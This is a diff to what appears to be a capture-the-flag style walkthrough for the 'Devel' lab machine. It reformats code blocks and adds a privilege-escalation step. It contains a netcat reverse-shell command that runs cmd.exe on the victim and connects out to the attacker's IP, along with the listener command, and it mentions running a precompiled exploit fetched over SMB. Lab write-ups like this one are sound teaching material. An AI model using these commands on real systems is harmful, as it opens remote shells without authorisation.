@@ -137,17 +137,22 @@ Victim machine:
 
 Then, run netcat in both machines for connection:
 
-
-``
-### Victim machine ###
+```
+- Victim machine:
 
 .\nc.exe -e cmd.exe <yourVpnIP> <yourPORT>
-``
+```
 
-``
-### Attacker machine ###
+```
+- Attacker machine:
 
 nc -lnvp 1338
-``
+```
 
 <p align="center"><img src="https://user-images.githubusercontent.com/43796175/107429726-3ba17900-6af2-11eb-8b25-bf034e303e16.jpg"></p>
+
+At this point, you have another shell, so you should proceed download the *okExploit.exe* in Devel machine with SMB that was configured before. Let's try run the exploit previously compiled for get a privilege escalation:
+
+<p align="center"><img src="https://user-images.githubusercontent.com/43796175/107430804-a8694300-6af3-11eb-85dc-ecd2474d2ad4.jpg"></p>
+
+And it's gone.
